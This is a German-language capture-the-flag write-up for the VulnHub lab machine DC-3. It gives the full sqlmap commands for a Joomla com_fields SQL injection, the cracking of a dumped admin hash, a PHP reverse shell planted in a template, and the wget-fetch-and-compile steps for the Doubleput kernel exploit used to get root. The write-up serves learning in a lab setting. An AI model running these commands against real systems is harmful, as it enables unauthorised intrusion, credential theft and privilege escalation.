# Mein CTF-Writeup für die Box DC-3 (VulnHub)

Bei der DC-3 Box lag der Fokus auf der Pentest-Methodik für ein Joomla-CMS, dem Ausnutzen einer SQL-Injection über `sqlmap` und dem anschließenden Ausbruch aus dem Webserver via Kernel-Exploit zur Erlangung der Root-Rechte.

## 1. Portscan & Enumeration

Zuerst habe ich einen vollständigen Portscan mit `nmap` durchgeführt, um die Angriffsfläche zu ermitteln:

```bash
nmap -p 1-65535 -T4 -A -v 192.168.6.3

```

**Ergebnis:** Port 80 war offen. `nmap` lieferte mir auch direkt den entscheidenden Hinweis auf die Software: Ein Apache-Webserver, auf dem das CMS **Joomla!** läuft.

Um spezifische Infos über die Joomla-Installation zu bekommen, habe ich das Tool `joomscan` gestartet:

```bash
joomscan --url http://192.168.6.3

```

---

## 2. SQL-Injection via SQLMap

Die Recherche nach bekannten Schwachstellen für die gefundene Joomla-Version führte mich zu einer SQL-Injection-Anfälligkeit in der Komponente `com_fields`.

Um die Datenbank systematisch zu durchsuchen, habe ich `sqlmap` mit erhöhten Level- und Risk-Parametern auf die verwundbare URL angesetzt:

```bash
sudo sqlmap -u "http://192.168.6.3/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p "list[fullordering]"

```

Nachdem die Datenbank `joomladb` gefunden wurde, habe ich mir die Tabellen auflisten lassen:

```bash
sqlmap -u 'http://192.168.6.3/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml' --risk=3 --level=5 --random-agent -D joomladb --tables

```

Aus der Struktur mit den 76 Tabellen stach die Tabelle `#__users` heraus. Aus dieser habe ich gezielt die Benutzernamen und Passwörter extrahiert (gedumpt):

```bash
sqlmap -u 'http://192.168.6.3/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml' --risk=3 --level=5 --random-agent -D joomladb -T '#__users' -C name,password --Dump

```

**Gefundener Eintrag:**

* `admin` : `$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu`

---

## 3. Password Cracking & Admin-Login

Den erhaltenen Bcrypt-Hash habe ich lokal in einer Datei gespeichert und mit `john` sowie der `rockyou.txt`-Wortliste angegriffen:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt /home/kali/Documents/hashDc3.txt

```

Nach kurzer Zeit wurde das Passwort im Klartext geknackt:

* **Passwort:** `snoopy`

Um das Admin-Panel zu finden, lief parallel ein Verzeichnis-Scan mit `dirsearch`:

```bash
dirsearch -u http://192.168.6.3

```

Der Scan lieferte mir das Verzeichnis `/administrator/`. Dort konnte ich mich mit den Zugangsdaten `admin` / `snoopy` erfolgreich im Joomla-Dashboard anmelden.

---

## 4. Reverse Shell & Standarisierung

Ein Versuch, direkt über die `index.php` Code auszuführen, schlug wegen fehlender Funktionen (`pcntl_fork`) und abgelehnten Verbindungen fehl.

Deshalb habe ich den Code des Standard-Templates angepasst. Im Joomla-Backend navigierte ich zu den Templates und editierte die Datei `error.php` des *Protostar*-Templates (`http://192.168.6.3/templates/protostar/error.php`). Dort habe ich einen PHP-Reverse-Shell-Code eingefügt, der auf meine Kali-IP und einen lauschenden Port (`nc -lvnp`) zurückschlägt.

Nach dem Aufruf der modifizierten `error.php` im Browser stand die Verbindung. Da die erhaltene `www-data`-Shell sehr instabil war, habe ich sie direkt über Python stabilisiert:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

```

---

## 5. Privilege Escalation (Kernel Exploit)

Da auf dem System ein älterer Ubuntu-Kernel lief, suchte ich nach passenden Kernel-Exploits und stieß auf die Sicherheitslücke *Doubleput* (CVE-2016-4557 / EDB-ID 39772).

Weil die Zielmaschine keine direkte Verbindung ins Internet hatte, um den Exploit direkt von GitLab zu laden, habe ich die Datei auf mein Kali-System heruntergeladen und dort temporär einen Webserver gestartet:

```bash
# Auf dem Kali-System:
wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip
python3 -m http.server 80

```

Anschließend konnte ich den Exploit im `/tmp`-Verzeichnis der Zielmaschine problemlos von meinem Kali-Server herunterladen und entpacken:

```bash
# In der www-data Shell:
cd /tmp
wget http://192.168.6.4/39772.zip

# Entpacken und vorbereiten
unzip 39772.zip
tar -xvf exploit.tar
cd ebpf_mapfd_doubleput_exploit
chmod +x compile.sh
./compile.sh

```

Nachdem das Kompilierungs-Skript durchgelaufen war, musste ich den Exploit nur noch ausführen:

```bash
./doubleput

```

Der Exploit nutzte die Schwachstelle im Kernel aus, erzeugte ein SUID-Binary und spuckte mir Sekunden später die ersehnte Shell aus. Die Überprüfung mit `whoami` bestätigte den Erfolg: **root**.

---

## 6. Finale Flagge

Als Root-User konnte ich nun in das Heimatverzeichnis wechseln und die finale Flagge auslesen:

```bash
cat the-flag.txt

```

```text
 __        __   _ _  ____                    _ _ _ _ 
 \ \      / /__| | | |  _ \  ___  _ __   ___| | | | |
  \ \ /\ / / _ \ | | | | | |/ _ \| '_ \ / _ \ | | | |
   \ V  V /  __/ | | | |_| | (_) | | | |  __/_|_|_|_|
    \_/\_/ \___|_|_| |____/ \___/|_| |_|\___(_|_|_|_)

Congratulations are in order.  :-)

```

Die Box DC-3 wurde damit erfolgreich abgeschlossen!